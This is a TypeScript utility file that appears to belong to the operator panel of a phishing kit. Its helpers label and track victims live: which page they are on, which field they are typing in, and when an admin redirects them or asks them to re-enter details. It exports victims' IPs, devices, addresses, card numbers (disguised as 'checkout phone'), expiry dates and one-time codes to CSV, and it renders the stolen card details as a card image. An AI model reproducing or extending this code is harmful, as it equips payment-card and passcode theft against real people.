import type { RecordRow } from '../types';

export function safeText(v: unknown) {
  return (v ?? '').toString();
}

export function formatVerifyMethod(v?: string) {
  const raw = safeText(v).trim();
  if (!raw) return '';
  const lower = raw.toLowerCase();
  if (lower.includes('phone') || lower.includes('sms') || lower.includes('mobile') || lower.includes('tel')) return '填写号码';
  if (lower.includes('email') || lower.includes('mail')) return '邮箱';
  return raw;
}

export function isSubId(id: RecordRow['id']) {
  return id.toString().includes('.');
}

export function mainIdOf(id: RecordRow['id']) {
  return parseInt(id.toString().split('.')[0], 10);
}

export function compareRecordIdDesc(a: RecordRow['id'], b: RecordRow['id']) {
  const pa = a
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));
  const pb = b
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));

  if ((pb[0] ?? 0) !== (pa[0] ?? 0)) return (pb[0] ?? 0) - (pa[0] ?? 0);
  return (pb[1] ?? -1) - (pa[1] ?? -1);
}

export function fmtAgo(ms: number) {
  if (ms < 1000) return '刚刚';
  const s = Math.floor(ms / 1000);
  if (s < 60) return `${s}秒前`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}分钟前`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}小时前`;
  return `${Math.floor(h / 24)}天前`;
}

function pageName(page?: string) {
  const p = (page || '').toLowerCase();
  if (p.includes('home')) return '首页';
  if (p.includes('info')) return '资料页';
  if (p.includes('emailverify')) return '邮箱验证页';
  if (p.includes('appcheck')) return '应用验证页';
  if (p.includes('verifyphone')) return '填写号码';
  if (p.includes('verify')) return '验证页';
  if (p.includes('checkout')) return '结账页';
  return page || '未知';
}

export function statusCategory(status?: string) {
  const s = (status || '').toLowerCase();
  if (!s) return 'unknown';
  if (s.includes('submitted') || s.includes('已提交')) return 'submitted';
  if (s.includes('refill') || s.includes('重填')) return 'refill';
  if (s.includes('editing') || s.includes('typing') || s.includes('filling') || s.includes('entered')) return 'progress';
  return 'other';
}

const FIELD_MAP: Array<{ keys: string[]; label: string }> = [
  { keys: ['fullname', 'full name', 'name'], label: '姓名' },
  { keys: ['address line 1', 'address1', 'address'], label: '地址' },
  { keys: ['address line 2', 'address2', 'fulladdress'], label: '完整地址' },
  { keys: ['city'], label: '城市' },
  { keys: ['state', 'province'], label: '州/省' },
  { keys: ['postal', 'zip', 'postalcode'], label: '邮编' },
  { keys: ['email'], label: '邮箱' },
  { keys: ['checkout phone', 'card number', 'number'], label: '号码' },
  { keys: ['phone', 'telephone'], label: '电话' },
  { keys: ['checkout name'], label: '结账姓名' },
  { keys: ['checkout expiry date', 'checkoutexpirydate', 'expiry date', 'expiry', 'mm/yy', 'valid thru'], label: '日期' },
  { keys: ['checkout code', 'verification code', 'otp'], label: '验证码' },
  { keys: ['checkout date'], label: '结账日期' },
  { keys: ['verify method', 'verifymethod'], label: '验证方式' },
  { keys: ['verify'], label: '验证' },
  { keys: ['emailverify'], label: '邮箱验证' },
  { keys: ['appcheck'], label: '应用验证' },
];

function detectFieldLabel(text: string) {
  const t = (text || '').toLowerCase();
  for (const item of FIELD_MAP) {
    if (item.keys.some((k) => t.includes(k))) return item.label;
  }
  return null;
}

export function toZhStatus(status?: string, page?: string) {
  const raw = (status || '').trim();
  const lower = raw.toLowerCase();

  if (!raw) return `停留在${pageName(page)}`;
  if (lower.includes('entered home')) return '用户进入';
  if (lower.includes('checkout submitted')) return '结账已提交';
  if (lower.includes('verify submitted')) return '验证码已提交';
  if (lower.includes('submitted')) return '已提交';
  if (lower.includes('checkout refill requested')) return '等待重填结账';
  if (lower.includes('refill requested')) return '等待重填资料';

  if (lower.includes('selected verify method:')) {
    const method = raw.split(':').slice(1).join(':').trim().toLowerCase();
    if (method === 'phone') return '填写号码';
    if (method === 'email') return '填写邮箱';
    return `已选择验证方式：${method || '-'}`;
  }

  const editing =
    raw.match(/^(editing|typing|input|filling)\s*[:：]?\s*(.+)$/i)?.[2]?.trim() ||
    raw.match(/^正在填写\s*[:：]?\s*(.+)$/)?.[1]?.trim() ||
    '';
  if (editing) return `填写${detectFieldLabel(editing) || editing}`;

  const entered = raw.match(/^entered\s+(.+)$/i)?.[1]?.trim();
  if (entered) return `进入${pageName(entered)}`;

  if (lower.includes('admin routed user')) {
    const target = raw.split('->').pop()?.trim();
    return target ? `管理员跳转到${pageName(target)}` : '管理员发起跳转';
  }

  if (lower.includes('editing') || lower.includes('typing') || lower.includes('filling')) {
    const f = detectFieldLabel(raw);
    return f ? `填写${f}` : `填写${pageName(page)}`;
  }

  return raw;
}

function escapeCsvCell(s: string) {
  const t = s ?? '';
  if (/[",\n\r]/.test(t)) return `"${t.replace(/"/g, '""')}"`;
  return t;
}

export function toCsv(records: RecordRow[]) {
  const headers = [
    '序号',
    '时间',
    'IP',
    '设备类型',
    '系统',
    '状态',
    '姓名',
    '地址',
    '完整地址',
    '城市',
    '州/省',
    '邮编',
    '电话',
    '邮箱',
    '结账姓名',
    '结账号码',
    '日期',
    '验证码',
    '验证方式',
    '验证',
    '邮箱验证',
    '应用验证',
  ];

  const lines = [
    headers.join(','),
    ...records.map((r) =>
      [
        r.id,
        r.time,
        r.ip,
        r.deviceType,
        r.deviceOS,
        toZhStatus(r.status, r.page),
        r.fullname,
        r.address,
        r.fulladdress,
        r.city,
        r.state,
        r.postalcode,
        r.telephone,
        r.email,
        r.checkoutName,
        r.checkoutPhone,
        r.checkoutExpiryDate,
        r.checkoutCode,
        formatVerifyMethod(r.verifyMethod),
        r.verify,
        r.emailVerify,
        r.appCheck,
      ]
        .map((v) => escapeCsvCell(v === undefined || v === null ? '' : typeof v === 'object' ? JSON.stringify(v) : String(v)))
        .join(',')
    ),
  ];
  return lines.join('\n');
}

function formatBankCardNumber(v?: string) {
  const raw = safeText(v).replace(/\D/g, '').slice(0, 16);
  const filled = (raw + '****************').slice(0, 16);
  return filled.match(/.{1,4}/g)?.join(' ') || filled;
}

function formatCardHolder(v?: string) {
  const name = safeText(v).trim();
  return name ? name.toUpperCase() : 'CARD HOLDER';
}

function escapeXml(v: string) {
  return v.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');
}

export function buildCardImageDataUrl(name?: string, number?: string, expiry?: string) {
  const holder = escapeXml(formatCardHolder(name));
  const cardDigits = safeText(number).replace(/\D/g, '').slice(0, 19);
  const cardGroups = [];
  for (let i = 0; i < cardDigits.length; i += 4) cardGroups.push(cardDigits.slice(i, i + 4));
  while (cardGroups.length < 4) cardGroups.push('----');
  const displayGroups = [
    escapeXml(cardGroups[0] || '----'),
    escapeXml(cardGroups[1] || '----'),
    escapeXml(cardGroups[2] || '----'),
    escapeXml(cardGroups.slice(3).join(' ') || '----'),
  ];
  const exp = escapeXml(safeText(expiry) || '--/--');
  const brand =
    cardDigits.startsWith('4')
      ? { name: 'VISA', fill: '#ffffff', accent: '#f7b731' }
      : cardDigits.startsWith('5')
        ? { name: 'MASTERCARD', fill: '#ffffff', accent: '#ff6b6b' }
        : { name: 'CARD', fill: '#ffffff', accent: '#8ab4ff' };
  const cardNumberBlocks = [
    { x: 84, text: displayGroups[0] },
    { x: 270, text: displayGroups[1] },
    { x: 456, text: displayGroups[2] },
    { x: 642, text: displayGroups[3] },
  ]
    .map(
      (group) =>
        `<text x="${group.x}" y="332" font-size="56" fill="#f8fafc" font-family="Consolas, Menlo, Monaco, monospace" font-weight="700" letter-spacing="2">${group.text}</text>`,
    )
    .join('');
  const svg = `
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="560" viewBox="0 0 900 560">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#123a7a"/>
      <stop offset="50%" stop-color="#0d2c5f"/>
      <stop offset="100%" stop-color="#081b3d"/>
    </linearGradient>
    <linearGradient id="panel" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="rgba(255,255,255,0.16)"/>
      <stop offset="100%" stop-color="rgba(255,255,255,0.06)"/>
    </linearGradient>
    <linearGradient id="chip" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#f7df93"/>
      <stop offset="50%" stop-color="#ddb14d"/>
      <stop offset="100%" stop-color="#a97d26"/>
    </linearGradient>
    <radialGradient id="glow" cx="0.2" cy="0.1" r="0.9">
      <stop offset="0%" stop-color="rgba(255,255,255,0.22)"/>
      <stop offset="100%" stop-color="rgba(255,255,255,0)"/>
    </radialGradient>
  </defs>
  <rect x="14" y="14" rx="38" ry="38" width="872" height="532" fill="url(#bg)" stroke="rgba(255,255,255,0.18)" stroke-width="2"/>
  <rect x="34" y="34" rx="30" ry="30" width="832" height="492" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="1.5"/>
  <circle cx="206" cy="102" r="248" fill="url(#glow)"/>
  <path d="M560 30c94 24 176 86 228 170v286H480c50-38 82-92 82-152 0-118-124-214-278-214-64 0-124 16-174 44 54-72 150-130 450-134z" fill="rgba(255,255,255,0.05)"/>
  <path d="M34 496c180-78 404-92 832-16" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="18" stroke-linecap="round"/>
  <rect x="74" y="152" rx="12" ry="12" width="104" height="76" fill="url(#chip)"/>
  <rect x="74" y="262" rx="28" ry="28" width="752" height="98" fill="url(#panel)" stroke="rgba(255,255,255,0.08)" stroke-width="1.5"/>
  ${cardNumberBlocks}
  <text x="74" y="96" font-size="24" fill="rgba(255,255,255,0.82)" font-family="Arial, Helvetica, sans-serif" font-weight="700" letter-spacing="2">VISA SIGNATURE</text>
  <text x="74" y="430" font-size="16" fill="rgba(255,255,255,0.62)" font-family="Arial, Helvetica, sans-serif" letter-spacing="2">CARDHOLDER NAME</text>
  <text x="74" y="470" font-size="32" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="700">${holder}</text>
  <text x="604" y="430" font-size="16" fill="rgba(255,255,255,0.62)" font-family="Arial, Helvetica, sans-serif" letter-spacing="2">VALID THRU</text>
  <text x="604" y="470" font-size="40" fill="#ffffff" font-family="Consolas, Menlo, Monaco, monospace" font-weight="700">${exp}</text>
  <rect x="690" y="102" rx="18" ry="18" width="142" height="58" fill="rgba(255,255,255,0.10)" stroke="rgba(255,255,255,0.14)" stroke-width="1.5"/>
  <text x="820" y="142" font-size="34" fill="${brand.fill}" font-family="Arial, Helvetica, sans-serif" text-anchor="end" font-weight="800" letter-spacing="1">${brand.name}</text>
  <path d="M748 154h46" stroke="${brand.accent}" stroke-width="6" stroke-linecap="round"/>
</svg>`.trim();
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
}
